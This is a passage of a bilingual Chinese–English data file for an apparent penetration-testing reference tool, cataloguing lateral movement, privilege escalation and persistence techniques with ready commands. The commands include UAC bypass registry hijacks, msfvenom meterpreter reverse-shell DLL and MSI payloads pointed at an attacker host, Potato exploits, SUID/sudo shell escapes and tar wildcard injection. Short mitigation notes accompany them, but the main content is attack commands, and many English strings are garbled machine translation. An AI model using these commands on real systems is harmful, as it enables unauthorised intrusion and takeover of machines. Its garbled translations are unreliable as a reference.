        title: { zh: '通过服务执行', en: 'throughServiceExecute' },
        command: 'sc \\\\target create evilsvc binPath= "cmd /c whoami"\nsc \\\\target start evilsvc\nsc \\\\target delete evilsvc',
        description: { zh: '创建并启动服务', en: 'Create and Start Service' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'sc \\\\target', explanation: { zh: '远程服务控制', en: 'Remote service control' } , type: 'domain' },
          { part: 'create evilsvc', explanation: { zh: '创建服务', en: 'CreateService' } , type: 'keyword' },
          { part: 'binPath=', explanation: { zh: '服务执行路径', en: 'ServiceExecutePath' } , type: 'parameter' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'SMBExec通过SMB创建服务执行命令。', en: 'SMBExecthroughSMBCreateServiceExecute Command.' },
      vulnerability: { zh: 'SMB允许远程服务管理。', en: 'SMBAllowRemoteService Management.' },
      exploitation: { zh: '利用流程：1) 连接SMB 2) 创建服务 3) 执行命令', en: 'Exploitationworkflow: 1) ConnectionSMB 2) CreateService 3) Execute Command' },
      mitigation: { zh: '防御措施：1) 禁用SMB 2) 限制远程服务创建 3) 监控服务日志', en: 'Defensemeasures: 1) Disable SMB 2) RestrictRemoteServiceCreate 3) MonitoringServiceLog' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lateral-atexec',
    name: { zh: 'ATExec横向移动', en: 'ATExec Lateral Movement' },
    description: { zh: '通过计划任务执行命令', en: 'Execute commands via scheduled tasks' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: { zh: '计划任务', en: 'Scheduled task' },
    tags: ['at', 'scheduled', 'lateral'],
    prerequisites: [{ zh: '计划任务权限', en: 'Scheduled task permissions' }, { zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: 'Impacket atexec',
        command: 'atexec.py domain/user:password@target "whoami"',
        description: { zh: '使用atexec执行命令', en: 'UseatexecExecute Command' },
        platform: 'linux'
      },
      {
        title: 'schtasks',
        command: 'schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00',
        description: { zh: '创建远程计划任务', en: 'Create a remote scheduled task' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/s target', explanation: { zh: '目标计算机', en: 'TargetComputers' } , type: 'parameter' },
          { part: '/tn "evil"', explanation: { zh: '任务名称', en: 'Task name' } , type: 'parameter' },
          { part: '/tr', explanation: { zh: '任务执行的程序', en: 'taskExecute Program' } , type: 'parameter' },
          { part: '/sc once', explanation: { zh: '执行一次', en: 'ExecuteOnetimes' } , type: 'parameter' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'ATExec通过计划任务执行命令。', en: 'ATExec executes commands via scheduled tasks.' },
      vulnerability: { zh: '计划任务允许远程创建和执行。', en: 'Scheduled tasks allow remote creation and execution.' },
      exploitation: { zh: '利用流程：1) 连接目标 2) 创建任务 3) 执行命令', en: 'Exploitationworkflow: 1) ConnectionTarget 2) Createtask 3) Execute Command' },
      mitigation: { zh: '防御措施：1) 限制远程任务创建 2) 监控任务日志', en: 'Defensemeasures: 1) RestrictRemotetaskCreate 2) MonitoringtaskLog' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lateral-winrs',
    name: { zh: 'WinRS横向移动', en: 'WinRS Lateral Movement' },
    description: { zh: '通过WinRS执行远程命令', en: 'throughWinRSExecuteRemoteCommand' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'WinRS',
    tags: ['winrs', 'lateral', 'windows'],
    prerequisites: [{ zh: 'WinRM启用', en: 'WinRMEnable' }, { zh: '有效凭证', en: 'EffectiveCredentials' }],
    execution: [
      {
        title: { zh: '执行命令', en: 'Execute Command' },
        command: 'winrs -r:target -u:user -p:password "whoami"',
        description: { zh: '远程执行命令', en: 'Remote Command Execution' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-r:target', explanation: { zh: '远程目标', en: 'RemoteTarget' } , type: 'parameter' },
          { part: '-u:user', explanation: { zh: '用户名', en: 'Username' } , type: 'parameter' },
          { part: '-p:password', explanation: { zh: '密码', en: 'Password' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '获取Shell', en: 'Get Shell' },
        command: 'winrs -r:target -u:user -p:password "cmd"',
        description: { zh: '获取远程CMD', en: 'ObtainRemoteCMD' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'WinRS是Windows远程Shell工具，基于WinRM。', en: 'WinRS is WindowsRemoteShellTools, Based onWinRM.' },
      vulnerability: { zh: 'WinRM启用时可通过WinRS执行命令。', en: 'WinRMEnableWhenCanthroughWinRSExecute Command.' },
      exploitation: { zh: '利用流程：1) 确认WinRM启用 2) 使用凭证连接 3) 执行命令', en: 'Exploitationworkflow: 1) ConfirmWinRMEnable 2) UseCredentialsConnection 3) Execute Command' },
      mitigation: { zh: '防御措施：1) 限制WinRM访问 2) 监控WinRM日志', en: 'Defensemeasures: 1) RestrictWinRMAccess 2) MonitoringWinRMLog' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'windows-privesc',
    name: { zh: 'Windows权限提升', en: 'Windows Privilege Escalation' },
    description: { zh: 'Windows系统提权技术', en: 'WindowsSystemPrivilege escalationTechnique' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'Windows',
    tags: ['privesc', 'windows', 'privilege'],
    prerequisites: [{ zh: '普通用户权限', en: 'Regular user privileges' }, { zh: '系统漏洞', en: 'SystemVulnerability' }],
    execution: [
      {
        title: { zh: '检查提权向量', en: 'CheckPrivilege escalationvector' },
        command: 'whoami /priv\nwhoami /groups',
        description: { zh: '检查当前权限', en: 'CheckcurrentPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '使用WinPEAS', en: 'UseWinPEAS' },
        command: 'winpeas.exe',
        description: { zh: '自动化提权检查', en: 'Automatic-izePrivilege escalationCheck' },
        platform: 'windows'
      },
      {
        title: { zh: '检查服务权限', en: 'CheckServicePermission' },
        command: 'accesschk.exe -uwcqv "Everyone" *',
        description: { zh: '检查可写服务', en: 'CheckwritableService' },
        platform: 'windows'
      },
      {
        title: { zh: '检查未引用服务路径', en: 'Check for unquoted service paths' },
        command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"  | findstr /i /v """',
        description: { zh: '查找未引用服务路径', en: 'Find unquoted service paths' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'Windows提权涉及多种向量，包括服务、DLL、注册表等。', en: 'Windows privilege escalation involves multiple vectors including services, DLLs, registry, and more.' },
      vulnerability: { zh: '配置错误、权限不当、内核漏洞。', en: 'Misconfigurations, improper permissions, and kernel vulnerabilities.' },
      exploitation: { zh: '利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权', en: 'Exploitationworkflow: 1) EnumerationSystem 2) DiscoverVulnerability 3) ExploitationPrivilege escalation' },
      mitigation: { zh: '防御措施：1) 最小权限原则 2) 及时更新补丁 3) 监控特权操作', en: 'Defenses: 1) Apply the principle of least privilege; 2) Keep patches up to date; 3) Monitor privileged operations' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'linux-privesc',
    name: { zh: 'Linux权限提升', en: 'Linux Privilege Escalation' },
    description: { zh: 'Linux系统提权技术', en: 'LinuxSystemPrivilege escalationTechnique' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'Linux',
    tags: ['privesc', 'linux', 'privilege'],
    prerequisites: [{ zh: '普通用户权限', en: 'Regular user privileges' }, { zh: '系统漏洞', en: 'SystemVulnerability' }],
    execution: [
      {
        title: { zh: '检查SUID', en: 'CheckSUID' },
        command: 'find / -perm -4000 -type f 2>/dev/null',
        description: { zh: '查找SUID文件', en: 'FindSUID Files' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'find /', explanation: { zh: '从根目录开始搜索', en: 'Search starting from the root directory' } , type: 'keyword' },
          { part: '-perm -4000', explanation: { zh: 'SUID权限位', en: 'SUIDPermissionbit' } , type: 'parameter' },
          { part: '-type f', explanation: { zh: '只搜索文件', en: 'only SearchFile' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '检查Sudo', en: 'CheckSudo' },
        command: 'sudo -l',
        description: { zh: '检查sudo权限', en: 'ChecksudoPermission' },
        platform: 'linux'
      },
      {
        title: { zh: '检查Cron', en: 'CheckCron' },
        command: 'cat /etc/crontab\nls -la /etc/cron*',
        description: { zh: '检查计划任务', en: 'Check scheduled tasks' },
        platform: 'linux'
      },
      {
        title: { zh: '使用LinPEAS', en: 'UseLinPEAS' },
        command: 'linpeas.sh',
        description: { zh: '自动化提权检查', en: 'Automatic-izePrivilege escalationCheck' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Linux提权涉及SUID、Sudo、Cron、内核漏洞等。', en: 'Linux privilege escalation involves SUID, Sudo, Cron, kernel vulnerabilities, and more.' },
      vulnerability: { zh: '配置错误、SUID滥用、内核漏洞。', en: 'Misconfigurations, SUID abuse, and kernel vulnerabilities.' },
      exploitation: { zh: '利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权', en: 'Exploitationworkflow: 1) EnumerationSystem 2) DiscoverVulnerability 3) ExploitationPrivilege escalation' },
      mitigation: { zh: '防御措施：1) 最小权限原则 2) 更新内核 3) 监控特权操作', en: 'Defenses: 1) Apply the principle of least privilege; 2) Update the kernel; 3) Monitor privileged operations' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'uac-bypass',
    name: { zh: 'UAC绕过', en: 'UAC Bypass' },
    description: { zh: '绕过Windows用户账户控制', en: 'Bypass Windows User Account Control (UAC)' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'UAC',
    tags: ['uac', 'bypass', 'windows'],
    prerequisites: [{ zh: '管理员组成员', en: 'Administrator group member' }, { zh: 'UAC启用', en: 'UACEnable' }],
    execution: [
      {
        title: 'Fodhelper',
        command: 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /d "" /f\nfodhelper.exe',
        description: { zh: '通过fodhelper绕过UAC', en: 'throughfodhelperBypassUAC' },
        platform: 'windows'
      },
      {
        title: 'Eventvwr',
        command: 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe" /f\neventvwr.exe',
        description: { zh: '通过eventvwr绕过UAC', en: 'througheventvwrBypassUAC' },
        platform: 'windows'
      },
      {
        title: { zh: '使用UACME', en: 'UseUACME' },
        command: 'Akagi64.exe 23 cmd.exe',
        description: { zh: '使用UACME工具', en: 'UseUACMETools' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'UAC可以通过特定程序或注册表操作绕过。', en: 'UACcanthroughspecificProgram or Registry OperationsBypass.' },
      vulnerability: { zh: '某些系统程序自动提升权限。', en: 'Certain system programs automatically elevate privileges.' },
      exploitation: { zh: '利用流程：1) 识别绕过方法 2) 修改注册表 3) 触发执行', en: 'Exploitationworkflow: 1) IdentifyBypassMethod 2) ModifyRegistry 3) TriggerExecute' },
      mitigation: { zh: '防御措施：1) 设置UAC为最高级别 2) 监控注册表修改', en: 'Defenses: 1) Set UAC to the highest level; 2) Monitor registry modifications' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'dll-hijack',
    name: { zh: 'DLL劫持', en: 'DLL Hijacking' },
    description: { zh: '通过DLL劫持提权', en: 'throughDLL HijackingPrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'DLL',
    tags: ['dll', 'hijack', 'privesc'],
    prerequisites: [{ zh: '可写目录', en: 'Writable Directories' }, { zh: 'DLL搜索顺序', en: 'DLL search order' }],
    execution: [
      {
        title: { zh: '查找DLL劫持', en: 'FindDLL Hijacking' },
        command: '使用Procmon监控DLL加载',
        description: { zh: '监控进程加载的DLL', en: 'MonitoringProcessLoad DLL' },
        platform: 'windows'
      },
      {
        title: { zh: '创建恶意DLL', en: 'CreateMaliciousDLL' },
        command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll',
        description: { zh: '生成恶意DLL', en: 'GenerateMaliciousDLL' },
        platform: 'linux'
      },
      {
        title: { zh: '放置DLL', en: 'Plant a DLL' },
        command: 'copy evil.dll "C:\\Program Files\\VulnerableApp\\missing.dll"',
        description: { zh: '放置DLL到目标位置', en: 'Plant a DLL in the target location' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DLL劫持利用DLL搜索顺序加载恶意DLL。', en: 'DLL hijacking exploits the DLL search order to load a malicious DLL.' },
      vulnerability: { zh: 'DLL搜索顺序优先当前目录。', en: 'The DLL search order prioritizes the current directory.' },
      exploitation: { zh: '利用流程：1) 找到可劫持DLL 2) 创建恶意DLL 3) 触发加载', en: 'Exploitationworkflow: 1) Find to CanHijackingDLL 2) CreateMaliciousDLL 3) TriggerLoad' },
      mitigation: { zh: '防御措施：1) 使用绝对路径 2) 安全DLL搜索模式', en: 'Defenses: 1) Use absolute paths; 2) Enable Safe DLL Search Mode' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'service-exploit',
    name: { zh: '服务提权', en: 'Service Privilege Escalation' },
    description: { zh: '通过服务漏洞提权', en: 'throughServiceVulnerabilityPrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: { zh: '服务', en: 'Service' },
    tags: ['service', 'privesc', 'windows'],
    prerequisites: [{ zh: '服务修改权限', en: 'ServiceModifyPermission' }, { zh: '可写服务路径', en: 'writableServicePath' }],
    execution: [
      {
        title: { zh: '检查服务权限', en: 'CheckServicePermission' },
        command: 'accesschk.exe -uwcqv "Users" *',
        description: { zh: '检查用户可修改的服务', en: 'CheckUsersCanModify Service' },
        platform: 'windows'
      },
      {
        title: { zh: '修改服务路径', en: 'ModifyServicePath' },
        command: 'sc config VulnerableService binPath= "cmd /c whoami"',
        description: { zh: '修改服务执行路径', en: 'ModifyServiceExecutePath' },
        platform: 'windows'
      },
      {
        title: { zh: '重启服务', en: 'RestartService' },
        command: 'sc stop VulnerableService\nsc start VulnerableService',
        description: { zh: '重启服务执行命令', en: 'RestartServiceExecute Command' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '服务配置不当可导致提权。', en: 'Misconfigured services can lead to privilege escalation.' },
      vulnerability: { zh: '服务权限配置错误，路径可写。', en: 'ServicePermissionConfigurationError, Pathwritable.' },
      exploitation: { zh: '利用流程：1) 枚举服务 2) 检查权限 3) 修改执行', en: 'Exploitationworkflow: 1) EnumerationService 2) CheckPermission 3) ModifyExecute' },
      mitigation: { zh: '防御措施：1) 正确设置服务权限 2) 使用引号路径', en: 'Defenses: 1) Set service permissions correctly; 2) Use quoted paths' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'always-install',
    name: { zh: 'AlwaysInstallElevated提权', en: 'AlwaysInstallElevated Privilege Escalation' },
    description: { zh: '利用AlwaysInstallElevated提权', en: 'ExploitationAlwaysInstallElevated Privilege Escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'MSI',
    tags: ['msi', 'alwaysinstall', 'privesc'],
    prerequisites: [{ zh: 'AlwaysInstallElevated启用', en: 'AlwaysInstallElevatedEnable' }],
    execution: [
      {
        title: { zh: '检查设置', en: 'CheckSet' },
        command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
        description: { zh: '检查是否启用', en: 'Check is WhetherEnable' },
        platform: 'windows'
      },
      {
        title: { zh: '创建MSI', en: 'CreateMSI' },
        command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi',
        description: { zh: '生成恶意MSI', en: 'GenerateMaliciousMSI' },
        platform: 'linux'
      },
      {
        title: { zh: '安装MSI', en: 'InstallationMSI' },
        command: 'msiexec /quiet /qn /i evil.msi',
        description: { zh: '安装MSI执行代码', en: 'InstallationMSIExecuteCode' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'AlwaysInstallElevated允许用户以SYSTEM权限安装MSI。', en: 'AlwaysInstallElevatedAllowUsers with SYSTEMPermissionInstallationMSI.' },
      vulnerability: { zh: '注册表配置允许任何用户以高权限安装。', en: 'Registry configurations allowing any user to install with elevated privileges.' },
      exploitation: { zh: '利用流程：1) 检查设置 2) 创建MSI 3) 安装执行', en: 'Exploitationworkflow: 1) CheckSet 2) CreateMSI 3) InstallationExecute' },
      mitigation: { zh: '防御措施：1) 禁用AlwaysInstallElevated 2) 监控MSI安装', en: 'Defensemeasures: 1) DisableAlwaysInstallElevated 2) MonitoringMSIInstallation' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'juicy-potato',
    name: { zh: 'Juicy Potato提权', en: 'Juicy Potato Privilege Escalation' },
    description: { zh: '利用COM对象和SeImpersonatePrivilege提权', en: 'ExploitationCOM for Object and SeImpersonatePrivilegePrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'Potato',
    tags: ['juicy-potato', 'com', 'privesc'],
    prerequisites: ['SeImpersonatePrivilege', 'Windows < 2019'],
    execution: [
      {
        title: { zh: '检查权限', en: 'CheckPermission' },
        command: 'whoami /priv | findstr SeImpersonate',
        description: { zh: '检查SeImpersonatePrivilege', en: 'CheckSeImpersonatePrivilege' },
        platform: 'windows'
      },
      {
        title: { zh: '执行JuicyPotato', en: 'ExecuteJuicyPotato' },
        command: 'JuicyPotato.exe -t * -p cmd.exe -l 1337',
        description: { zh: '使用JuicyPotato提权', en: 'UseJuicyPotato Privilege Escalation' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-t *', explanation: { zh: '创建进程类型', en: 'CreateProcessType' } , type: 'parameter' },
          { part: '-p cmd.exe', explanation: { zh: '要执行的程序', en: 'NeedExecute Program' } , type: 'parameter' },
          { part: '-l 1337', explanation: { zh: '监听端口', en: 'listeningPort' } , type: 'parameter' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'Juicy Potato利用COM对象和SeImpersonatePrivilege提权。', en: 'Juicy PotatoExploitationCOM for Object and SeImpersonatePrivilegePrivilege escalation.' },
      vulnerability: { zh: 'COM对象可被滥用获取SYSTEM权限。', en: 'COM objects can be abused to obtain SYSTEM privileges.' },
      exploitation: { zh: '利用流程：1) 检查权限 2) 选择CLSID 3) 执行提权', en: 'Exploitation workflow: 1) Check permissions; 2) Choose a CLSID; 3) Execute privilege escalation' },
      mitigation: { zh: '防御措施：1) 移除SeImpersonatePrivilege 2) 升级Windows', en: 'Defensemeasures: 1) RemoveSeImpersonatePrivilege 2) UpgradeWindows' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'printspoofer',
    name: { zh: 'PrintSpoofer提权', en: 'PrintSpoofer Privilege Escalation' },
    description: { zh: '利用打印机服务提权', en: 'Exploit the Print Spooler service for privilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'PrintSpoofer',
    tags: ['printspoofer', 'privesc', 'windows'],
    prerequisites: ['SeImpersonatePrivilege'],
    execution: [
      {
        title: { zh: '执行PrintSpoofer', en: 'ExecutePrintSpoofer' },
        command: 'PrintSpoofer.exe -i -c cmd',
        description: { zh: '使用PrintSpoofer提权', en: 'UsePrintSpoofer Privilege Escalation' },
        platform: 'windows'
      },
      {
        title: { zh: '指定命令', en: 'specifiedCommand' },
        command: 'PrintSpoofer.exe -c "whoami > C:\\out.txt"',
        description: { zh: '执行指定命令', en: 'ExecutespecifiedCommand' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'PrintSpoofer利用打印机服务获取SYSTEM权限。', en: 'PrintSpoofer exploits the Print Spooler service to obtain SYSTEM privileges.' },
      vulnerability: { zh: '打印机服务允许特权模拟。', en: 'The Print Spooler service allows privilege impersonation.' },
      exploitation: { zh: '利用流程：1) 检查权限 2) 执行PrintSpoofer', en: 'Exploitationworkflow: 1) CheckPermission 2) ExecutePrintSpoofer' },
      mitigation: { zh: '防御措施：1) 移除SeImpersonatePrivilege 2) 禁用打印服务', en: 'Defenses: 1) Remove SeImpersonatePrivilege; 2) Disable the Print Spooler service' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'godpotato',
    name: { zh: 'GodPotato提权', en: 'GodPotato Privilege Escalation' },
    description: { zh: 'GodPotato提权工具', en: 'GodPotato Privilege EscalationTools' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'GodPotato',
    tags: ['godpotato', 'privesc', 'windows'],
    prerequisites: ['SeImpersonatePrivilege'],
    execution: [
      {
        title: { zh: '执行GodPotato', en: 'ExecuteGodPotato' },
        command: 'GodPotato.exe -cmd "cmd /c whoami"',
        description: { zh: '使用GodPotato提权', en: 'UseGodPotato Privilege Escalation' },
        platform: 'windows'
      },
      {
        title: { zh: '反向Shell', en: 'Reverse shell' },
        command: 'GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"',
        description: { zh: '执行反向Shell', en: 'Execute a reverse shell' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'GodPotato是JuicyPotato的改进版，支持更多Windows版本。', en: 'GodPotato is an improved version of JuicyPotato that supports a wider range of Windows versions.' },
      vulnerability: { zh: 'COM对象和特权模拟漏洞。', en: 'COM object and privilege impersonation vulnerabilities.' },
      exploitation: { zh: '利用流程：1) 检查权限 2) 执行GodPotato', en: 'Exploitationworkflow: 1) CheckPermission 2) ExecuteGodPotato' },
      mitigation: { zh: '防御措施：1) 移除SeImpersonatePrivilege 2) 更新系统', en: 'Defensemeasures: 1) RemoveSeImpersonatePrivilege 2) UpdateSystem' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'suid-exploit',
    name: { zh: 'SUID提权', en: 'SUID Privilege Escalation' },
    description: { zh: '利用SUID文件提权', en: 'ExploitationSUID FilesPrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'SUID',
    tags: ['suid', 'privesc', 'linux'],
    prerequisites: [{ zh: '存在SUID文件', en: 'hasSUID Files' }, { zh: '可利用程序', en: 'CanExploitationProgram' }],
    execution: [
      {
        title: { zh: '查找SUID', en: 'FindSUID' },
        command: 'find / -perm -4000 -type f 2>/dev/null',
        description: { zh: '查找所有SUID文件', en: 'FindallSUID Files' },
        platform: 'linux'
      },
      {
        title: { zh: '常见可利用程序', en: 'commonCanExploitationProgram' },
        command: 'nmap --interactive\nvim -c \':!/bin/sh\'\nfind / -exec /bin/sh \\;\ncp /bin/sh /tmp/sh; chmod +s /tmp/sh',
        description: { zh: '常见SUID利用方法', en: 'commonSUIDExploitationMethod' },
        platform: 'linux'
      },
      {
        title: 'GTFOBins',
        command: '参考GTFOBins网站查找可利用程序',
        description: { zh: '查找程序利用方法', en: 'FindProgramExploitationMethod' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SUID文件以文件所有者权限执行，可能被利用提权。', en: 'SUID Files with FileallPersonPermissionExecute, Possible by ExploitationPrivilege escalation.' },
      vulnerability: { zh: 'SUID程序存在漏洞或可被滥用。', en: 'SUID programs may have vulnerabilities or can be abused.' },
      exploitation: { zh: '利用流程：1) 查找SUID文件 2) 分析可利用性 3) 执行提权', en: 'Exploitationworkflow: 1) FindSUID Files 2) AnalyzeCanExploitationProperty 3) ExecutePrivilege escalation' },
      mitigation: { zh: '防御措施：1) 审计SUID文件 2) 移除不必要的SUID', en: 'Defensemeasures: 1) AuditSUID Files 2) Remove not Necessary SUID' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sudo-exploit',
    name: { zh: 'Sudo提权', en: 'Sudo Privilege Escalation' },
    description: { zh: '利用Sudo配置提权', en: 'ExploitationSudoConfigurationPrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'Sudo',
    tags: ['sudo', 'privesc', 'linux'],
    prerequisites: [{ zh: 'Sudo权限配置不当', en: 'Sudo permission misconfiguration' }],
    execution: [
      {
        title: { zh: '检查Sudo权限', en: 'CheckSudoPermission' },
        command: 'sudo -l',
        description: { zh: '列出可执行的sudo命令', en: 'ListCanExecute sudoCommand' },
        platform: 'linux'
      },
      {
        title: { zh: '常见利用', en: 'commonExploitation' },
        command: 'sudo vim -c \':!/bin/sh\'\nsudo find / -exec /bin/sh \\;\nsudo awk \'BEGIN {system("/bin/sh")}\'',
        description: { zh: '常见sudo利用方法', en: 'commonsudoExploitationMethod' },
        platform: 'linux'
      },
      {
        title: 'CVE-2021-3156',
        command: '利用sudo堆溢出漏洞',
        description: { zh: 'Baron Samedit漏洞', en: 'Baron SameditVulnerability' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Sudo配置不当允许用户以root执行特定命令。', en: 'Sudo misconfiguration allows users to run specific commands as root.' },
      vulnerability: { zh: 'Sudo规则允许执行可逃逸的程序。', en: 'Sudo rules allow execution of programs that can be escaped.' },
      exploitation: { zh: '利用流程：1) 检查sudo权限 2) 找到可利用程序 3) 执行提权', en: 'Exploitationworkflow: 1) ChecksudoPermission 2) Find to CanExploitationProgram 3) ExecutePrivilege escalation' },
      mitigation: { zh: '防御措施：1) 限制sudo规则 2) 使用NOEXEC标签', en: 'Defensemeasures: 1) RestrictsudoRule 2) UseNOEXECtag' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'cron-exploit',
    name: { zh: 'Cron提权', en: 'Cron Privilege Escalation' },
    description: { zh: '利用Cron任务提权', en: 'ExploitationCron JobsPrivilege escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: 'Cron',
    tags: ['cron', 'privesc', 'linux'],
    prerequisites: [{ zh: '可写Cron脚本', en: 'writableCronScript' }, { zh: '通配符注入', en: 'Wildcard injection' }],
    execution: [
      {
        title: { zh: '检查Cron任务', en: 'CheckCron Jobs' },
        command: 'cat /etc/crontab\nls -la /etc/cron*',
        description: { zh: '查看计划任务', en: 'View scheduled tasks' },
        platform: 'linux'
      },
      {
        title: { zh: '检查脚本权限', en: 'CheckScriptPermission' },
        command: 'ls -la /path/to/cron/script.sh',
        description: { zh: '检查Cron脚本权限', en: 'CheckCronScriptPermission' },
        platform: 'linux'
      },
      {
        title: { zh: '通配符注入', en: 'Wildcard injection' },
        command: '在Cron目录创建: --checkpoint=1\n--checkpoint-action=exec=sh shell.sh',
        description: { zh: '利用tar通配符注入', en: 'Exploit tar wildcard injection' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Cron任务以特定用户执行，可被利用提权。', en: 'Cron Jobs with specificUsersExecute, Can by ExploitationPrivilege escalation.' },
      vulnerability: { zh: '脚本可写、通配符注入、PATH劫持。', en: 'Writable scripts, wildcard injection, and PATH hijacking.' },
      exploitation: { zh: '利用流程：1) 检查Cron任务 2) 发现漏洞 3) 利用提权', en: 'Exploitationworkflow: 1) CheckCron Jobs 2) DiscoverVulnerability 3) ExploitationPrivilege escalation' },
      mitigation: { zh: '防御措施：1) 使用绝对路径 2) 限制脚本权限 3) 避免通配符', en: 'Defenses: 1) Use absolute paths; 2) Restrict script permissions; 3) Avoid wildcards' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'kernel-exploit',
    name: { zh: '内核漏洞提权', en: 'Kernel Exploit Privilege Escalation' },
    description: { zh: '利用内核漏洞提权', en: 'ExploitationKernel Exploit Privilege Escalation' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: { zh: '内核', en: 'Kernel' },
    tags: ['kernel', 'privesc', 'exploit'],
    prerequisites: [{ zh: '存在内核漏洞', en: 'hasKernel Exploits' }, { zh: '可编译/执行exploit', en: 'CanCompile/Executeexploit' }],
    execution: [
      {
        title: { zh: '检查内核版本', en: 'Check kernel version' },
        command: 'uname -a\ncat /proc/version',
        description: { zh: '查看内核版本信息', en: 'View kernel version information' },
        platform: 'linux'
      },
      {
        title: { zh: '搜索exploit', en: 'Searchexploit' },
        command: 'searchsploit kernel VERSION',
        description: { zh: '搜索内核exploit', en: 'Search for kernel exploits' },
        platform: 'linux'
      },
      {
        title: { zh: '常见内核漏洞', en: 'commonKernel Exploits' },
        command: 'DirtyCow (CVE-2016-5195)\nDirtyPipe (CVE-2022-0847)\nPwnKit (CVE-2021-4034)',
        description: { zh: '常见内核提权漏洞', en: 'Common kernel privilege escalation vulnerabilities' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: '内核漏洞可以直接获取root权限。', en: 'Kernel ExploitscanDirectlyObtainrootPermission.' },
      vulnerability: { zh: '内核代码存在漏洞，可被利用。', en: 'Kernel code contains vulnerabilities that can be exploited.' },
      exploitation: { zh: '利用流程：1) 识别内核版本 2) 找到对应exploit 3) 编译执行', en: 'Exploitation workflow: 1) Identify the kernel version; 2) Find a matching exploit; 3) Compile and execute' },
      mitigation: { zh: '防御措施：1) 及时更新内核 2) 使用SELinux 3) 限制编译环境', en: 'Defenses: 1) Keep the kernel up to date; 2) Use SELinux; 3) Restrict the compilation environment' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'persistence-wmi',
    name: { zh: 'WMI持久化', en: 'WMI Persistence' },
    description: { zh: '通过WMI事件订阅实现持久化', en: 'Achieve persistence via WMI event subscriptions' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: 'WMI',
    tags: ['wmi', 'persistence', 'windows'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }],
    execution: [
      {
        title: { zh: '创建事件过滤器', en: 'CreateEventFilterTool' },
